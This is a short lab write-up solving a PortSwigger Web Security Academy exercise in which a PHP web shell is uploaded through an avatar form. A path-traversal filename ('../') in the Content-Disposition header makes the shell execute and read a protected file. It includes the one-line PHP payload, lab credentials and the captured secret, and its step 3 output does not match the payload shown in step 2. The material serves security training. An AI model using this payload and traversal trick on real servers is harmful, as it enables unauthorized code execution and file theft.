# Lab Writeup: Web shell upload via path traversal

URL: https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/preventing-file-execution-in-user-accessible-directories/file-upload/lab-file-upload-web-shell-upload-via-path-traversal#

## Description

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Login using `wiener:peter`
2. Create the following php payload:

   ```php
   <?php echo file_get_contents('/home/carlos/secret') ?>
   ```

3. Try uploading the payload as avatar, open the uploaded file in new tab and you'll get the following output:

   ```txt
    <?php echo file_get_contents('../../../home/carlos/secret'); ?>
   ```

   basically the payload will not be executed but displayed

4. Try uploading the payload again but intercept it this time:

   ![traversal-shell](/assets/traversal-shell.png)

   From the above image, we can see that `Content-Disposition` value is `filename="rce-webshell-upload.php"`, change it to `filename="../rce-webshell-upload.php"`

5. forward the intercepted and modified request and try opening the payload image again in new tab then you'll get the secret value `kBJNF5rdH4GMlLgIwloueuSZV2d9RxGE`
6. Submit the value and the lab should be changed:

   ![traversal-shell-1](/assets/traversal-shell-1.png)
